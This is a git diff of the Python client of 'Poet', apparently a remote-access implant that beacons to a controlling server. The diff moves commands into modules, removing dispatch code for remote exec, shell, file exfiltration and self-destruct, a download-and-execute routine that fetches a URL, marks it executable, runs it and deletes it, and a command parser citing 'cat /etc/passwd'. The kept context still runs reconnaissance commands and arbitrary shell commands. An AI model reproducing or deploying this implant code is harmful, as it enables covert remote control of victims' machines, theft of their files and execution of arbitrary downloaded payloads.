@@ -1,18 +1,13 @@
 #!/usr/bin/python2.7
 
 import os
-import re
 import sys
-import stat
 import time
-import zlib
 import base64
-import select
 import socket
 import os.path
 import urllib2
 import argparse
-import tempfile
 import subprocess as sp
 
 import debug
@@ -66,35 +61,6 @@ class PoetClient(object):
                     found = True
                     break
 
-                # elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-                #     s.send(self.execute(inp))
-                # elif inp == 'recon':
-                #     s.send(zlib.compress(self.recon()))
-                # elif inp.startswith('shell '):
-                #     self.shell(inp, s)
-                #     s.send('shelldone')
-                # elif inp.startswith('exfil '):
-                #     try:
-                #         with open(os.path.expanduser(inp[6:])) as f:
-                #             s.send(zlib.compress(f.read()))
-                #     except IOError as e:
-                #         s.send(e.strerror)
-                # elif inp == 'selfdestruct':
-                #     try:
-                #         selfdestruct()
-                #         s.send('boom')
-                #         sys.exit()
-                #     except Exception as e:
-                #         s.send(str(e.message))
-                # elif inp.startswith('dlexec '):
-                #     try:
-                #         self.dlexec(inp)
-                #         s.send('done')
-                #     except Exception as e:
-                #         s.send(str(e.message))
-                # elif inp.startswith('chint'):
-                #     self.chint(s, inp)
-
                 for cmd, func in module.client_commands.iteritems():
                     if inp.split()[0] == cmd:
                         found = True
@@ -112,83 +78,12 @@ class PoetClient(object):
                     raise
         self.s.close()
 
-    def execute(self, inp):
-        """Handle server `exec' command.
-
-        Execute specially formatted input string and return specially formatted
-        response.
-        """
-
-        out = ''
-        cmds = self.parse_exec_cmds(inp[5:])
-        for cmd in cmds:
-            cmd_out = self.cmd_exec(cmd)
-            out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
-        return out
-
     def recon(self):
         """Executes recon commands."""
 
         ipcmd = 'ip addr' if 'no' in self.cmd_exec('which ifconfig') else 'ifconfig'
         exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
         return self.execute(exec_str)
-
-    def dlexec(self, inp):
-        """Handle server `dlexec' command.
-
-        Download file from internet, save to temp file, execute.
-        """
-
-        r = urllib2.urlopen(inp.split()[1])
-        with tempfile.NamedTemporaryFile(delete=False) as f:
-            f.write(r.read())
-            f.flush()
-            os.fchmod(f.fileno(), stat.S_IRWXU)
-
-        # intentionally not using sp.call() here because we don't
-        # necessarily want to wait() on the process. also, this is outside
-        # the with block to avoid a `Text file busy' error (linux)
-        sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
-
-        # we need this sleep(1) because of a race condition between the
-        # Popen and following remove. If there were no sleep, in the Popen,
-        # between the time it takes for the parent to fork, and the child's
-        # exec syscall to load the file into memory, the parent would return
-        # back here and delete the file before it gets executed. by sleeping
-        # 1 second, we give the child a reasonable amount of time to hit the
-        # exec syscall.
-        #
-        # NOTE: this is not a 100% solution. if for some reason, the time
-        # between the child fork/exec is longer than 1 second (lol) the file
-        # will still be deleted before it's executed. a "safer" solution would
-        # be to keep track of all the paths of files downloaded and add a
-        # shell "cleanup" command which could be run regularly to remove all
-        # those paths after you know they're executed
-        time.sleep(1)
-
-        os.remove(f.name)
-
-    def chint(self, s, inp):
-        """Handle server `chint' command.
-
-        Send back the current delay interval or set it to new value.
-        """
-
-        if inp == 'chint':
-            # no arg, so just send back the interval
-            s.send(str(args.interval))
-        else:
-            # set interval to arg
-            try:
-                num = int(inp.split()[1])
-                if num < 1:
-                    msg = 'Invalid interval time.'
-                else:
-                    args.interval = num
-                    msg = 'done'
-                s.send(msg)
-            except Exception as e:
-                s.send(str(e.message))
 
     def selfdestruct(self):
         """Trampoline to execute real, global selfdestruct function. It's
@@ -215,26 +110,6 @@ class PoetClient(object):
 
         return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                         shell=True).communicate()[0]
-
-    def parse_exec_cmds(self, inp):
-        """Parse string provided by server `exec' command.
-
-        Convert space delimited string with commands to execute in quotes, for
-        example ("ls -l" "cat /etc/passwd") into list with commands as strings.
-
-        Returns:
-            List of commands to execute.
-        """
-
-        if inp.count('"') == 2:
-            return [inp[1:-1]]
-        else:
-            # server side regex guarantees that these quotes will be in the
-            # correct place -- the space between two commands
-            third_quote = inp.find('" "') + 2
-            first_cmd = inp[:third_quote-1]
-            rest = inp[third_quote:]
-            return [first_cmd[1:-1]] + self.parse_exec_cmds(rest)
 
 
 def get_args():
